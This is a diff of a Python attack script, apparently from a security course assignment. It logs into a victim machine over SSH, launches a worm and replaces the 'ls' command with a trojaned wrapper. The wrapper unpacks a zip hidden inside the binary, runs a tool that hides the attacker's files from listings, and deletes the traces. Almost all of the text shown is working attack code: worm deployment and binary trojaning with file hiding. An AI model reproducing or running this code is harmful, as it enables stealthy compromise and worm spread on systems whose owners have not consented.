@@ -19,7 +19,7 @@ def ssh(vic_ip, vic_user, vic_passwd):
         return ssh(vic_ip, vic_user, vic_passwd)
     
 def task1(vic_ip, vic_user):
-    dat_file = open('victim.dat', 'r')
+    dat_file = open('../../../app/victim.dat', 'r')
     frag_str = dat_file.read().splitlines()
 
     for plen in range(1, len(frag_str)+1):
@@ -48,7 +48,7 @@ f.close()
 
 virus_payload2 = '''
 chmod +x worm
-./worm &
+./worm
 '''
 
 # init folder: /home/csc2024
@@ -67,9 +67,9 @@ def task2(connection, att_ip, att_port):
         f.write('dd if=ls of=lst.zip bs=1 skip=1024 count=' + str(zip_byte) + ' >/dev/null 2>&1\n')
         f.write('unzip lst.zip >/dev/null 2>&1\n')
         f.write('rm lst.zip\n')
-        f.write('./lst -I lst -I worm \"$@\"\n')
-        f.write('rm lst\n')
         f.write('rm worm\n')
+        f.write('./lst -I lst \"$@\"\n')
+        f.write('rm lst\n')
         f.write('exit 0\n')
 
     original_byte = int(os.popen("wc -c ls | awk '{print $1}'").read())
